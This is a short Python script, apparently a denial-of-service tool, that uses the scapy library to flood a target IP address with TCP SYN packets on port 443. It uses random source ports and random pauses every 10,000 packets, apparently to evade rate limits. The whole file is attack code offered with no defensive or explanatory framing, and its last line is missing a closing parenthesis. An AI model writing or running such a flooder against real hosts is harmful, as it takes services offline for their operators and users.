from scapy.all import IP, TCP, send  
from random import randint , uniform
from time import sleep

i = 0
def tarrer(ip_addr):
    ip = IP(dst=ip_addr)
    global i
    while True:
        tcp = TCP(sport=randint(2000,60000), dport=443, flags="S") 
        send(ip/tcp)
        i += 1
        sleep(0.01)
        if i % 10000 == 0:
            sleep(uniform(1,3)
